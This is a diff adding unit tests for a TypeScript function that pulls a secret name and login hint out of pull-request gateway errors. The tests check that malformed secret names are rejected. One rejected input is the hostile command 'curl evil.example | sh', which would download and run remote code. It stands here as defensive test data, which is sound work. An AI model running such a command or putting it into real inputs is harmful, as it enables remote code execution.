@@ -7,6 +7,19 @@ const hint = (host: string) =>
   `Run \`glab auth login --hostname ${host}\`, then retry.`
 
 describe('pullRequestErrorDetails login remedy', () => {
+  it('reads the secret name the gateway ships as its own field', () => {
+    const name = `BITBUCKET_SERVER_TOKEN_${'AB'.repeat(20)}`
+    expect(pullRequestErrorDetails(body({ error: `Store it as ${name}.`, secretName: name })).secretName)
+      .toBe(name)
+  })
+
+  it('never lifts a secret name out of the message text, nor takes a malformed field', () => {
+    expect(pullRequestErrorDetails(body({ error: 'Store it as BITBUCKET_SERVER_TOKEN.' })).secretName).toBe('')
+    for (const secretName of ['curl evil.example | sh', 'lower_case', '', 42, 'A'.repeat(641)]) {
+      expect(pullRequestErrorDetails(body({ error: 'x', secretName })).secretName).toBe('')
+    }
+  })
+
   it('offers the host-scoped command the gateway sends as loginCommand', () => {
     const details = pullRequestErrorDetails(body({
       error: `glab: 401 Unauthorized ${hint('git.example.com')}`,
